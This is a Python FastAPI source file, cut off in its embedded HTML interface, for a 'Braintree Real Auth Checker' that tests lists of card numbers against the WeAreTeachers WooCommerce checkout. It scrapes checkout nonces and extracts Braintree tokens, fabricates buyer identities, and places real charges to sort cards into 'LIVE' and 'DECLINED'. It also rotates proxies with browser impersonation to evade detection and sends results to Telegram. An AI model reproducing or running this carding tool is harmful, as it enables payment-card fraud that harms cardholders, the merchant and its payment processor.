from __future__ import annotations

import asyncio
import base64
import html as htmllib
import json
import logging
import os
import random
import re
import time
import urllib.parse
import uuid
from dataclasses import dataclass, field
from typing import Any

from fastapi import FastAPI, Query
from fastapi.responses import HTMLResponse
from curl_cffi.requests import AsyncSession
from faker import Faker

logging.basicConfig(
    level=os.getenv("LOG_LEVEL", "INFO"),
    format="%(asctime)s %(levelname)s %(name)s %(message)s",
)
logger = logging.getLogger("ollie.weareteachers.checker")

app = FastAPI(title="WeAreTeachers Braintree Real Auth Checker", version="9.9.0")

RAW_DORK_GATES: dict[str, dict[str, str]] = {
    "weareteachers_bt": {
        "name": "WeAreTeachers (Braintree WooCommerce Real Auth)",
        "base_url": "https://www.weareteachers.com",
        "preload_url": "https://www.weareteachers.com/?add-to-cart=1909302",
        "auth_url": "https://www.weareteachers.com/?wc-ajax=checkout",
        "engine": "weareteachers_braintree",
    },
}

fake = Faker("en_US")
Faker.seed()

US_TAX_FREE_ADDRESSES = [
    {"address_1": "86 Bloomfield St.", "address_2": "", "city": "Pawtucket", "state": "RI", "postcode": "02861", "phone": "(401) 475-3095"},
    {"address_1": "750 SW Yamhill St", "address_2": "", "city": "Portland", "state": "OR", "postcode": "97205", "phone": "(503) 226-1111"},
    {"address_1": "1000 Elm St", "address_2": "", "city": "Manchester", "state": "NH", "postcode": "03101", "phone": "(603) 625-1000"},
    {"address_1": "1201 N Market St", "address_2": "", "city": "Wilmington", "state": "DE", "postcode": "19801", "phone": "(302) 658-9000"},
    {"address_1": "208 N Broadway", "address_2": "", "city": "Billings", "state": "MT", "postcode": "59101", "phone": "(406) 252-5555"},
]


@dataclass(frozen=True, slots=True)
class AuthVerdict:
    status: str
    reason: str
    http_status: int | None = None
    latency_ms: float = 0.0
    bin_info: dict[str, str] = field(default_factory=dict)
    target_used: str = ""
    waf_status: str = "CLEAN"
    card_masked: str | None = None
    proxy_used: str | None = None

    def to_dict(self) -> dict[str, Any]:
        return {
            "status": self.status,
            "reason": self.reason,
            "http_status": self.http_status,
            "latency_ms": round(self.latency_ms, 2),
            "bin_info": self.bin_info,
            "target_used": self.target_used,
            "waf_status": self.waf_status,
            "card_masked": self.card_masked,
            "proxy_used": self.proxy_used,
        }


def verify_luhn(card_number: str) -> bool:
    if not card_number.isdigit() or not (13 <= len(card_number) <= 19):
        return False
    checksum = 0
    for idx, digit in enumerate(map(int, reversed(card_number))):
        if idx % 2 == 1:
            doubled = digit * 2
            checksum += doubled - 9 if doubled > 9 else doubled
        else:
            checksum += digit
    return checksum % 10 == 0


def universal_card_formatter(raw_line: str) -> tuple[str, str, str, str] | None:
    clean = raw_line.strip()
    if not clean or clean.startswith("#"):
        return None
    
    parts = [p.strip() for p in re.split(r"[|:/\\\s-]+", clean) if p.strip()]
    if len(parts) >= 4:
        cc = parts[0]
        mm = parts[1].zfill(2)
        yy = parts[2]
        cvv = parts[3]
        if len(yy) == 4:
            yy = yy[-2:]
        if cc.isdigit() and mm.isdigit() and yy.isdigit() and cvv.isdigit():
            if verify_luhn(cc) and (1 <= int(mm) <= 12):
                return cc, mm, yy, cvv

    numbers = re.findall(r"\d+", clean)
    if not numbers:
        return None

    full_digits = "".join(numbers)
    match = re.search(r"(?P<cc>\d{13,19})(?P<mm>0[1-9]|1[0-2])(?P<yy>\d{2,4})(?P<cvv>\d{3,4})", full_digits)
    if match:
        cc = match.group("cc")
        mm = match.group("mm")
        yy = match.group("yy")[-2:]
        cvv = match.group("cvv")
        if verify_luhn(cc) and (1 <= int(mm) <= 12):
            return cc, mm, yy, cvv

    return None


def is_card_expired(mm: str, yy: str) -> bool:
    try:
        month = int(mm)
        full_year = int(f"20{yy}" if len(yy) == 2 else yy)
        current_year = 2026
        current_month = 1
        if full_year < current_year:
            return True
        if full_year == current_year and month < current_month:
            return True
    except Exception:
        return True
    return False


def parse_proxy_string(proxy_url: str | None) -> dict[str, str] | None:
    if not proxy_url or not proxy_url.strip():
        return None
    raw = proxy_url.strip()
    
    if "://" in raw:
        formatted = raw
    else:
        parts = raw.split(":")
        if len(parts) == 4:
            host, port, user, pw = parts
            formatted = f"http://{user}:{pw}@{host}:{port}"
        else:
            formatted = f"http://{raw}"
            
    return {"http": formatted, "https": formatted}


async def fetch_bin_metadata(card_number: str, proxies: dict[str, str] | None = None) -> dict[str, str]:
    bin_code = card_number[:6]
    default_meta = {"bank": "Unknown Bank", "country": "US", "scheme": "CARD", "type": "CREDIT"}
    try:
        async with AsyncSession(impersonate="chrome124", proxies=proxies, verify=False, timeout=8) as session:
            resp = await session.get(
                f"https://lookup.binlist.net/{bin_code}",
                headers={"Accept-Version": "3"},
                timeout=4,
            )
            if resp.status_code == 200:
                data = resp.json()
                return {
                    "bank": data.get("bank", {}).get("name", "Unknown Bank"),
                    "country": data.get("country", {}).get("alpha2", "US"),
                    "scheme": data.get("scheme", "CARD").upper(),
                    "type": data.get("type", "CREDIT").upper(),
                }
    except Exception:
        pass
    return default_meta


def decode_bt_token(raw: str) -> str | None:
    if not raw:
        return None
    raw = raw.strip().strip('"').strip("'")
    try:
        pad = len(raw) % 4
        dec_raw = raw + ("=" * (4 - pad) if pad else "")
        dec = base64.b64decode(dec_raw).decode("utf-8", "ignore")
        m = re.search(r'"authorizationFingerprint"\s*:\s*"([^"]+)"', dec)
        if m:
            return m.group(1)
    except Exception:
        pass
    m_direct = re.search(r'"authorizationFingerprint"\s*:\s*"([^"]+)"', raw)
    if m_direct:
        return m_direct.group(1)
    return None


def extract_checkout_tokens(html: str) -> dict[str, str]:
    out: dict[str, str] = {
        "store_nonce": "",
        "cart_token": "",
        "wp_rest_nonce": "",
        "client_token_nonce": "",
        "expected_total": "999",
    }

    m_sn = re.search(r"storeApiNonce\s*:\s*['\"]([a-f0-9]+)['\"]", html, re.I)
    if m_sn:
        out["store_nonce"] = m_sn.group(1)

    m_wpn = re.search(r"createNonceMiddleware\(\s*['\"]([a-f0-9]+)['\"]\s*\)", html, re.I)
    if m_wpn:
        out["wp_rest_nonce"] = m_wpn.group(1)

    m_ctn = re.search(r'"client_token_nonce"\s*:\s*"([a-f0-9]+)"', html, re.I)
    if m_ctn:
        out["client_token_nonce"] = m_ctn.group(1)

    for encoded_blob in re.findall(r"decodeURIComponent\(\s*'([^']+)'\s*\)", html):
        try:
            decoded = urllib.parse.unquote(encoded_blob)
        except Exception:
            continue

        if not out["client_token_nonce"]:
            m = re.search(r'"client_token_nonce"\s*:\s*"([a-f0-9]+)"', decoded)
            if m:
                out["client_token_nonce"] = m.group(1)

        if not out["store_nonce"]:
            m = re.search(r'"Nonce"\s*:\s*"([a-f0-9]+)"', decoded)
            if m:
                out["store_nonce"] = m.group(1)

        if not out["cart_token"]:
            m = re.search(r'"Cart-Token"\s*:\s*"([^"]+)"', decoded)
            if m:
                out["cart_token"] = m.group(1)

        m_tot = re.search(r'"total_price"\s*:\s*"(\d+)"', decoded)
        if m_tot:
            out["expected_total"] = m_tot.group(1)

    return out


async def fetch_braintree_fingerprint(session: AsyncSession, client_token_nonce: str) -> str | None:
    ajax_url = "https://www.weareteachers.com/wp-admin/admin-ajax.php"
    try:
        r = await session.post(
            ajax_url,
            data={
                "action": "wc_braintree_credit_card_get_client_token",
                "nonce": client_token_nonce,
            },
            headers={
                "accept": "application/json, text/javascript, */*; q=0.01",
                "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                "origin": "https://www.weareteachers.com",
                "referer": "https://www.weareteachers.com/checkout/",
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
                "x-requested-with": "XMLHttpRequest",
            },
            timeout=8,
        )
        if r.status_code != 200:
            return None
        try:
            j = r.json()
            if isinstance(j, dict):
                data_val = j.get("data")
                if isinstance(data_val, str):
                    fp = decode_bt_token(data_val)
                    if fp:
                        return fp
                elif isinstance(data_val, dict):
                    fp = data_val.get("authorizationFingerprint") or decode_bt_token(json.dumps(data_val))
                    if fp:
                        return fp
        except Exception:
            pass
        return decode_bt_token(r.text)
    except Exception:
        return None


def detect_wc_card_type(cc: str, brand_code: str = "") -> str:
    b = brand_code.upper()
    if "VISA" in b or cc.startswith("4"):
        return "visa"
    if "MASTER" in b or cc[:2] in ("51", "52", "53", "54", "55") or (cc[:4].isdigit() and 2221 <= int(cc[:4]) <= 2720):
        return "master-card"
    if "AMEX" in b or "AMERICAN" in b or cc[:2] in ("34", "37"):
        return "american-express"
    if "DISCOVER" in b or cc.startswith("6011") or cc.startswith("65"):
        return "discover"
    if "JCB" in b or cc.startswith("35"):
        return "jcb"
    if "DINERS" in b or cc[:2] in ("36", "38"):
        return "diners-club"
    if "MAESTRO" in b:
        return "maestro"
    return "visa"


# --- REAL AUTH ENGINE: WEARETEACHERS (Braintree WooCommerce Processing) ---
async def execute_weareteachers_auth(session: AsyncSession, cc: str, mm: str, yy: str, cvv: str) -> tuple[str, str, int]:
    host = "https://www.weareteachers.com"
    product_url = f"{host}/?add-to-cart=1909302"
    checkout_url = f"{host}/checkout/"
    store_checkout_url = f"{host}/wp-json/wc/store/v1/checkout?_locale=site"
    bt_graphql = "https://payments.braintree-api.com/graphql"
    ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"

    ident = {
        "first_name": fake.first_name(),
        "last_name": fake.last_name(),
        "company": "",
        "country": "US",
        **random.choice(US_TAX_FREE_ADDRESSES),
        "email": f"{fake.first_name().lower()}.{fake.last_name().lower()}{random.randint(10, 99999)}@gmail.com"
    }
    session_id = str(uuid.uuid4())

    prod_res = await session.get(product_url, headers={"accept": "text/html", "user-agent": ua, "referer": host + "/"}, timeout=10)
    if prod_res.status_code >= 400:
        return "DECLINED", f"Product load failed HTTP {prod_res.status_code}", prod_res.status_code

    co = await session.get(checkout_url, headers={"accept": "text/html", "user-agent": ua, "referer": product_url}, timeout=12)
    if co.status_code >= 400 or "/checkout" not in co.url:
        return "DECLINED", f"Checkout load failed HTTP {co.status_code}", co.status_code

    html = co.text
    tokens = extract_checkout_tokens(html)
    store_nonce = tokens["store_nonce"] or co.headers.get("Nonce", "")
    cart_token = tokens["cart_token"] or co.headers.get("Cart-Token", "")
    wp_rest_nonce = tokens["wp_rest_nonce"]
    client_token_nonce = tokens["client_token_nonce"]
    total = tokens["expected_total"] or "999"

    if not client_token_nonce or not store_nonce:
        return "DECLINED", "Checkout parameters missing (nonces)", 200

    fingerprint = await fetch_braintree_fingerprint(session, client_token_nonce)
    if not fingerprint:
        return "DECLINED", "Failed to retrieve Braintree fingerprint", 200

    tokenize_query = (
        "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { "
        "  tokenizeCreditCard(input: $input) { "
        "    token "
        "    creditCard { "
        "      bin brandCode last4 cardholderName expirationMonth expirationYear "
        "      binData { issuingBank } "
        "    } "
        "  } "
        "}"
    )
    tp = {
        "clientSdkMetadata": {"source": "client", "integration": "custom", "sessionId": session_id},
        "query": tokenize_query,
        "variables": {
            "input": {
                "creditCard": {
                    "number": cc, "expirationMonth": mm, "expirationYear": yy, "cvv": cvv,
                    "cardholderName": f"{ident['first_name']} {ident['last_name']}",
                    "billingAddress": {
                        "countryCodeAlpha2": ident["country"], "extendedAddress": ident["address_2"],
                        "locality": ident["city"], "region": ident["state"], "firstName": ident["first_name"],
                        "lastName": ident["last_name"], "postalCode": ident["postcode"], "streetAddress": ident["address_1"]
                    }
                },
                "options": {"validate": False}
            }
        },
        "operationName": "TokenizeCreditCard"
    }

    bt_resp = await session.post(
        bt_graphql,
        json=tp,
        headers={
            "accept": "*/*", "authorization": "Bearer " + fingerprint, "braintree-version": "2018-05-10",
            "content-type": "application/json", "origin": "https://assets.braintreegateway.com",
            "referer": "https://assets.braintreegateway.com/", "user-agent": ua
        },
        timeout=10
    )
    try:
        bj = bt_resp.json()
    except Exception:
        return "DECLINED", f"Tokenize non-json HTTP {bt_resp.status_code}", bt_resp.status_code

    tokenize_obj = (bj.get("data") or {}).get("tokenizeCreditCard") or {}
    nonce_token = tokenize_obj.get("token")
    if not nonce_token:
        err = bj.get("errors") or bj.get("error") or "No token returned"
        clean_err = htmllib.unescape(str(err))
        return "DECLINED", f"Tokenize error: {clean_err[:80]}", 200

    cc_meta = tokenize_obj.get("creditCard") or {}
    bin_data = cc_meta.get("binData") or {}
    brand_code = cc_meta.get("brandCode") or ""
    bank_tag = (bin_data.get("issuingBank") or brand_code or "").strip()
    wc_card_type = detect_wc_card_type(cc, brand_code)

    checkout_payload = {
        "additional_fields": {},
        "billing_address": {
            "first_name": ident["first_name"], "last_name": ident["last_name"], "company": ident["company"],
            "address_1": ident["address_1"], "address_2": ident["address_2"], "city": ident["city"],
            "state": ident["state"], "postcode": ident["postcode"], "country": ident["country"],
            "email": ident["email"], "phone": ident["phone"]
        },
        "create_account": False, "customer_note": "", "customer_password": "",
        "extensions": {"woocommerce/order-attribution": {"source_type": "typein", "referrer": "(none)"}},
        "expected_total": str(total),
        "payment_method": "braintree_credit_card",
        "payment_data": [
            {"key": "wc_braintree_device_data", "value": json.dumps({"correlation_id": session_id})},
            {"key": "wc_braintree_credit_card_payment_nonce", "value": nonce_token},
            {"key": "wc-braintree-credit-card-card-type", "value": wc_card_type},
            {"key": "wc_braintree_credit_card_card_type", "value": wc_card_type},
            {"key": "wc-braintree_credit_card-new-payment-method", "value": False},
        ],
    }

    checkout_headers = {
        "accept": "application/json, */*;q=0.1", "content-type": "application/json",
        "nonce": store_nonce, "origin": host, "referer": checkout_url, "user-agent": ua
    }
    if cart_token: checkout_headers["cart-token"] = cart_token
    if wp_rest_nonce: checkout_headers["x-wp-nonce"] = wp_rest_nonce

    rr = await session.post(
        store_checkout_url,
        data=json.dumps(checkout_payload),
        headers=checkout_headers,
        timeout=12
    )
    try:
        jj = rr.json()
    except Exception:
        return "DECLINED", f"Checkout non-json HTTP {rr.status_code}", rr.status_code

    order_status = str(jj.get("status", "")).lower()
    payment_result = jj.get("payment_result") or {}
    payment_status = str(payment_result.get("payment_status", "")).lower()

    if rr.status_code in (200, 201) and (order_status in ("processing", "completed", "on-hold") or payment_status == "success"):
        oid = jj.get("order_id") or "?"
        return "LIVE", f"Charged Successfully! Order ID: {oid} | [{bank_tag}]", rr.status_code

    msgs = jj.get("message") or ""
    if not msgs and isinstance(payment_result.get("payment_details"), list):
        for item in payment_result["payment_details"]:
            if isinstance(item, dict) and item.get("key") in ("errorMessage", "message"):
                msgs = str(item.get("value", ""))
                break
    if not msgs:
        cart_errs = ((jj.get("data") or {}).get("cart") or {}).get("errors") or []
        if cart_errs and isinstance(cart_errs[0], dict):
            msgs = cart_errs[0].get("message") or cart_errs[0].get("code") or ""

    reason = htmllib.unescape(msgs or jj.get("code") or f"HTTP {rr.status_code}")
    clean_reason = re.sub(r"<[^>]+>", " ", reason).strip()
    return "DECLINED", f"{clean_reason} | [{bank_tag}]", rr.status_code


async def run_auth_check(card_line: str, proxy_url: str | None = None, target_key: str = "weareteachers_bt") -> AuthVerdict:
    started = time.perf_counter()
    proxies_dict = parse_proxy_string(proxy_url)

    gate = RAW_DORK_GATES["weareteachers_bt"]

    parsed = universal_card_formatter(card_line)
    if not parsed:
        return AuthVerdict(
            status="DECLINED",
            reason="Declined: Invalid Format / Failed Luhn Check",
            latency_ms=(time.perf_counter() - started) * 1000,
            target_used=gate["name"],
            card_masked=card_line[:19],
            proxy_used=proxy_url,
        )

    cc, mm, yy, cvv = parsed
    card_masked = f"{cc[:6]}******{cc[-4:]}|{mm}|{yy}|{cvv}"

    if is_card_expired(mm, yy):
        bin_info = await fetch_bin_metadata(cc, proxies_dict)
        return AuthVerdict(
            status="DECLINED",
            reason="Declined: Card Expired (Pre-Auth Guard)",
            latency_ms=(time.perf_counter() - started) * 1000,
            bin_info=bin_info,
            target_used=gate["name"],
            card_masked=card_masked,
            proxy_used=proxy_url,
        )

    bin_task = asyncio.create_task(fetch_bin_metadata(cc, proxies_dict))
    browser_headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
    }

    max_retries = 1
    last_exc = None

    for attempt in range(max_retries + 1):
        try:
            async with AsyncSession(
                impersonate="chrome124",
                proxies=proxies_dict,
                headers=browser_headers,
                verify=False,
                timeout=20,
            ) as session:
                status, reason, code = await execute_weareteachers_auth(session, cc, mm, yy, cvv)

                bin_info = await bin_task
                elapsed = (time.perf_counter() - started) * 1000
                return AuthVerdict(
                    status=status,
                    reason=reason,
                    http_status=code,
                    latency_ms=elapsed,
                    bin_info=bin_info,
                    target_used=gate["name"],
                    card_masked=card_masked,
                    proxy_used=proxy_url,
                )
        except Exception as exc:
            last_exc = exc
            if attempt < max_retries:
                await asyncio.sleep(0.5)
                continue
            break

    bin_info = await bin_task
    elapsed = (time.perf_counter() - started) * 1000
    err_str = str(last_exc)
    if "SSL" in err_str or "TLS" in err_str:
        clean_reason = "Proxy SSL/TLS Handshake Failed (Dead Proxy)"
    else:
        clean_reason = f"Network Error / Proxy Failed: {type(last_exc).__name__}"

    return AuthVerdict(
        status="DECLINED",
        reason=clean_reason,
        latency_ms=elapsed,
        bin_info=bin_info,
        target_used=gate["name"],
        card_masked=card_masked,
        proxy_used=proxy_url,
    )


@app.get("/api/proxy/test")
async def test_proxy(proxy: str) -> dict[str, Any]:
    start = time.perf_counter()
    proxies_dict = parse_proxy_string(proxy)
    try:
        async with AsyncSession(impersonate="chrome124", proxies=proxies_dict, verify=False, timeout=8) as session:
            resp = await session.get("https://api.ipify.org?format=json", timeout=5)
            latency = (time.perf_counter() - start) * 1000
            if resp.status_code == 200:
                ip_val = resp.json().get("ip", "OK")
                return {"status": "LIVE", "latency_ms": round(latency, 2), "proxy": proxy, "ip": ip_val}
    except Exception:
        pass
    return {"status": "DECLINED", "latency_ms": 0.0, "proxy": proxy}


@app.get("/api/auth/check")
async def check_card_endpoint(
    card: str,
    proxy: str | None = None,
    target: str = "weareteachers_bt",
) -> dict[str, Any]:
    verdict = await run_auth_check(card_line=card, proxy_url=proxy, target_key=target)
    return verdict.to_dict()


@app.get("/api/telegram/send")
async def send_telegram_alert(token: str = Query(...), chat_id: str = Query(...), message: str = Query(...)) -> dict[str, Any]:
    tg_url = f"https://api.telegram.org/bot{token}/sendMessage"
    try:
        async with AsyncSession(verify=False, timeout=8) as session:
            resp = await session.post(tg_url, data={"chat_id": chat_id, "text": message}, timeout=8)
            if resp.status_code == 200:
                return {"success": True}
    except Exception:
        pass
    return {"success": False}


@app.get("/", response_class=HTMLResponse)
async def index() -> str:
    return """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>WeAreTeachers Braintree Real Auth Checker</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @keyframes pulseGlow {
            0%, 100% { box-shadow: 0 0 15px rgba(16, 185, 129, 0.2); }
            50% { box-shadow: 0 0 30px rgba(16, 185, 129, 0.5); }
        }
        .live-box-glow {
            animation: pulseGlow 2.5s infinite;
        }
        .custom-scrollbar::-webkit-scrollbar {
            width: 6px;
        }
        .custom-scrollbar::-webkit-scrollbar-track {
            background: #09090b;
        }
        .custom-scrollbar::-webkit-scrollbar-thumb {
            background: #27272a;
            border-radius: 3px;
        }
        .custom-scrollbar::-webkit-scrollbar-thumb:hover {
            background: #3f3f46;
        }
    </style>
</head>
<body class="bg-zinc-950 text-white min-h-screen p-6">
    <main class="max-w-5xl mx-auto space-y-6">
        <div class="flex flex-wrap items-center justify-between border-b border-zinc-800 pb-4 gap-2">
            <div>
                <h1 class="text-2xl font-bold text-emerald-400 flex items-center gap-2">
                    <span class="inline-block w-3 h-3 bg-emerald-500 rounded-full animate-ping"></span>
                    WeAreTeachers Braintree Checker
                </h1>
                <p class="text-xs text-zinc-400 font-mono">WooCommerce Store API + Braintree GraphQL Engine</p>
            </div>
            <div class="flex gap-2">
                <button onclick="autoFormatCards()" class="text-xs bg-emerald-950 hover:bg-emerald-900 text-emerald-200 border border-emerald-700/50 px-3 py-1.5 rounded-lg transition font-semibold">
                    ✨ Auto-Format
                </button>
                <button onclick="cleanDuplicates()" class="text-xs bg-zinc-900 hover:bg-zinc-800 text-zinc-300 border border-zinc-700/50 px-3 py-1.5 rounded-lg transition">Clean Dups</button>
                <button onclick="clearLogs()" class="text-xs bg-amber-950/60 hover:bg-amber-900 text-amber-200 border border-amber-700/50 px-3 py-1.5 rounded-lg transition">Clear Logs</button>
                <button onclick="exportLiveResults()" class="text-xs bg-emerald-900/60 hover:bg-emerald-800 text-emerald-200 border border-emerald-700 px-3 py-1.5 rounded-lg transition">Export Live</button>
            </div>
        </div>

        <div class="bg-zinc-900/90 backdrop-blur-md rounded-xl p-5 space-y-4 shadow-xl border border-zinc-800/80">
            <div class="grid grid-cols-1 md:grid-cols-3 gap-4">
                <div class="md:col-span-2">
                    <label class="block text-xs font-medium text-zinc-400 mb-1">Gateway Engine</label>
                    <select id="targetSelect" class="w-full bg-zinc-950 border border-zinc-700 rounded-lg p-2.5 text-xs font-mono text-emerald-300 focus:outline-none focus:ring-1 focus:ring-emerald-500">
                        <option value="weareteachers_bt">⚡ WEARETEACHERS BRAINTREE GATEWAY ($9.99)</option>
                    </select>
                </div>
                <div class="flex items-end gap-3">
                    <div class="flex-1">
                        <label class="block text-xs font-medium text-zinc-400 mb-1">Proxy Threads</label>
                        <input id="proxyThreads" type="number" value="50" min="1" max="200" class="w-full bg-zinc-950 border border-zinc-700 rounded-lg p-2 text-xs font-mono text-center">
                    </div>
                    <div class="flex-1">
                        <label class="block text-xs font-medium text-zinc-400 mb-1">Card Threads</label>
                        <input id="cardThreads" type="number" value="3" min="1" max="50" class="w-full bg-zinc-950 border border-zinc-700 rounded-lg p-2 text-xs font-mono text-center">
                    </div>
                </div>
            </div>

            <!-- Telegram Config Box -->
            <div class="grid grid-cols-1 md:grid-cols-2 gap-4 bg-zinc-950/80 p-3 rounded-lg border border-zinc-800">
                <div>
                    <label class="block text-xs font-medium text-zinc-400 mb-1">Telegram Bot Token</label>
                    <input id="tgToken" type="text" placeholder="123456789:ABCdefGhIJKlmNoPQRsTUVwxyZ" class="w-full bg-zinc-900 border border-zinc-700 rounded-lg p-2 text-xs font-mono">
                </div>
                <div>
                    <label class="block text-xs font-medium text-zinc-400 mb-1">Telegram Chat ID</label>
                    <input id="tgChatId" type="text" placeholder="-1001234567890 o ID" class="w-full bg-zinc-900 border border-zinc-700 rounded-lg p-2 text-xs font-mono">
                </div>
            </div>

            <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div class="space-y-2">
                    <div class="flex justify-between items-center">
                        <label class="text-xs font-medium text-zinc-400">Live Proxies Box</label>
                        <button onclick="checkAndPruneProxies()" class="bg-emerald-600 hover:bg-emerald-500 px-3 py-1 rounded text-xs font-semibold transition text-white">
                            ⚡ Test & Auto-Prune
                        </button>
                    </div>
                    <textarea id="proxyInput" rows="4" placeholder="http://user:pass@host:port"
                        class="w-full bg-zinc-950 border border-emerald-900/40 rounded-lg p-3 text-xs font-mono focus:outline-none text-emerald-300 custom-scrollbar"></textarea>
                </div>
                <div class="space-y-2">
                    <label class="text-xs font-medium text-rose-400">Dead Proxies Box (Auto-Dropped)</label>
                    <textarea id="deadProxyInput" rows="4" readonly placeholder="Dito mapupunta ang mga dead proxies..."
                        class="w-full bg-zinc-950 border border-rose-900/40 rounded-lg p-3 text-xs font-mono focus:outline-none text-rose-400 custom-scrollbar"></textarea>
                </div>
            </div>

            <div class="space-y-2">
                <label class="block text-xs font-medium text-zinc-400">Cards List (Supports YY or YYYY)</label>
                <textarea id="cardInput" rows="4" placeholder="545512...|02|26|005"
                    class="w-full bg-zinc-950 border border-zinc-700 rounded-lg p-3 text-xs font-mono focus:ring-2 focus:ring-emerald-500 focus:outline-none custom-scrollbar"></textarea>
            </div>

            <!-- Animated Progress Bar -->
            <div class="w-full bg-zinc-950 rounded-full h-2.5 overflow-hidden border border-zinc-800 relative">
                <div id="progressBar" class="bg-gradient-to-r from-emerald-600 to-emerald-400 h-2.5 w-0 transition-all duration-300 relative">
                    <div class="absolute inset-0 bg-white/20 animate-pulse"></div>
                </div>
            </div>

            <div class="grid grid-cols-3 gap-3 text-center text-xs font-mono">
                <div class="bg-zinc-950 border border-emerald-800/60 rounded-lg p-2.5 shadow-inner">
                    <span class="text-zinc-400 block">LIVE / CHARGED</span>
                    <span id="liveCount" class="text-lg font-bold text-emerald-400">0</span>
                </div>
                <div class="bg-zinc-950 border border-rose-800/60 rounded-lg p-2.5 shadow-inner">
                    <span class="text-zinc-400 block">DECLINED / DEAD</span>
                    <span id="deadCount" class="text-lg font-bold text-rose-400">0</span>
                </div>
                <div class="bg-zinc-950 border border-zinc-800 rounded-lg p-2.5 shadow-inner">
                    <span class="text-zinc-400 block">CHECKED</span>
                    <span id="checkedCount" class="text-lg font-bold text-zinc-200">0</span>
                </div>
            </div>

            <!-- Control Buttons -->
            <div class="flex gap-3">
                <button id="checkButton" onclick="runBatchChecker()"
                    class="bg-emerald-600 hover:bg-emerald-500 text-white px-5 py-3 rounded-lg font-semibold flex-1 transition shadow-lg shadow-emerald-950/50">
                    🚀 Start Real Auth Check
                </button>
                <button id="pauseButton" onclick="togglePause()" disabled
                    class="bg-amber-600 hover:bg-amber-500 text-white px-5 py-3 rounded-lg font-semibold transition disabled:opacity-50">
                    Pause
                </button>
                <button id="stopButton" onclick="stopChecker()" disabled
                    class="bg-rose-600 hover:bg-rose-500 text-white px-5 py-3 rounded-lg font-semibold transition disabled:opacity-50">
                    Stop
                </button>
            </div>

            <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div>
                    <h2 class="text-xs font-bold text-emerald-400 uppercase tracking-wider mb-2 flex items-center justify-between">
                        <span>Live / Charged</span>
                        <span class="text-[10px] text-zinc-500 font-normal">Auto-scroll Active</span>
                    </h2>
                    <div id="liveBox" class="bg-zinc-950 rounded-lg p-3 text-xs font-mono text-emerald-300 border border-emerald-900/50 min-h-[160px] max-h-80 overflow-y-auto space-y-1.5 custom-scrollbar live-box-glow"></div>
                </div>
                <div>
                    <h2 class="text-xs font-bold text-rose-400 uppercase tracking-wider mb-2">Declined / Dead</h2>
                    <div id="deadBox" class="bg-zinc-950 rounded-lg p-3 text-xs font-mono text-rose-300 border border-rose-900/50 min-h-[160px] max-h-80 overflow-y-auto space-y-1.5 custom-scrollbar"></div>
                </div>
            </div>
        </div>
    </main>
    <script>
    let isPaused = false;
    let isStopped = false;

    const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
    function playTone(type) {
        if (audioCtx.state === 'suspended') audioCtx.resume();
        const osc = audioCtx.createOscillator();
        const gain = audioCtx.createGain();
        osc.connect(gain);
        gain.connect(audioCtx.destination);
        osc.frequency.setValueAtTime(type === 'live' ? 880.00 : 220.00, audioCtx.currentTime);
        gain.gain.setValueAtTime(0.08, audioCtx.currentTime);
        gain.gain.exponentialRampToValueAtTime(0.0001, audioCtx.currentTime + 0.25);
        osc.start();
        osc.stop(audioCtx.currentTime + 0.25);
    }

    function autoFormatCards() {
        const ta = document.getElementById("cardInput");
        const lines = ta.value.split("\\n");
        let formatted = [];
        lines.forEach(line => {
            const cleanLine = line.trim();
            if (!cleanLine) return;
            const digits = cleanLine.match(/\\d+/g);
            if (!digits) return;
            const allNums = digits.join("");
            const m = allNums.match(/(\\d{13,19})(0[1-9]|1[0-2])(\\d{2,4})(\\d{3,4})/);
            if (m) {
                let cc = m[1];
                let mm = m[2];
                let yy = m[3].slice(-2);
                let cvv = m[4];
                formatted.push(`${cc}|${mm}|${yy}|${cvv}`);
            } else if (digits.length >= 4) {
                let cc = digits[0];
                let mm = digits[1].padStart(2, '0');
                let yy = digits[2].slice(-2);
                let cvv = digits[3];
                if (cc.length >= 13 && cc.length <= 19) {
                    formatted.push(`${cc}|${mm}|${yy}|${cvv}`);
                }
            }
        });
        ta.value = formatted.join("\\n");
        alert(`Auto-Formatted: ${formatted.length} cards cleaned!`);
    }

    function cleanDuplicates() {
        const ta = document.getElementById("cardInput");
        const unique = [...new Set(ta.value.split("\\n").map(l => l.trim()).filter(Boolean))];
        ta.value = unique.join("\\n");
    }

    function clearLogs() {
        document.getElementById("liveBox").innerHTML = "";
        document.getElementById("deadBox").innerHTML = "";
        document.getElementById("liveCount").textContent = "0";
        document.getElementById("deadCount").textContent = "0";
        document.getElementById("checkedCount").textContent = "0";
        document.getElementById("progressBar").style.width = "0%";
    }

    function exportLiveResults() {
        const rows = document.getElementById("liveBox").querySelectorAll("div");
        let text = "";
        rows.forEach(r => text += r.textContent + "\\n");
        if (!text) return alert("No live cards yet.");
        const blob = new Blob([text], { type: "text/plain" });
        const url = URL.createObjectURL(blob);
        const a = document.createElement("a");
        a.href = url;
        a.download = "live_weareteachers_cards.txt";
        a.click();
    }

    function togglePause() {
        isPaused = !isPaused;
        const btn = document.getElementById("pauseButton");
        btn.textContent = isPaused ? "Resume" : "Pause";
        btn.className = isPaused ? "bg-emerald-600 hover:bg-emerald-500 text-white px-5 py-3 rounded-lg font-semibold transition" : "bg-amber-600 hover:bg-amber-500 text-white px-5 py-3 rounded-lg font-semibold transition";
    }

    function stopChecker() {
        isStopped = true;
        isPaused = false;
        document.getElementById("checkButton").disabled = false;
        document.getElementById("checkButton").textContent = "🚀 Start Real Auth Check";
        document.getElementById("pauseButton").disabled = true;
        document.getElementById("stopButton").disabled = true;
